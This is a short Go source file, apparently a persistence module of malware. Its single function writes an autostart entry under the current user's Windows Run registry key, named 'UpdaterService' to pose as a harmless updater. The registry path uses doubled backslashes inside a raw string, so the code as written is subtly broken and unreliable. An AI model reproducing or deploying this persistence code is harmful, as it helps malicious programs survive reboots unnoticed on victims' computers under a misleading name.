package persistence

import (
	"golang.org/x/sys/windows/registry"
)

func tryInitRunkey(destPath string) bool {
	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\\Microsoft\\Windows\\CurrentVersion\\Run`, registry.SET_VALUE)
	if err != nil {
		return false
	}
	defer key.Close()

	appName := "UpdaterService"
	err = key.SetStringValue(appName, destPath)
	if err != nil {
		return false
	}
	return true
}
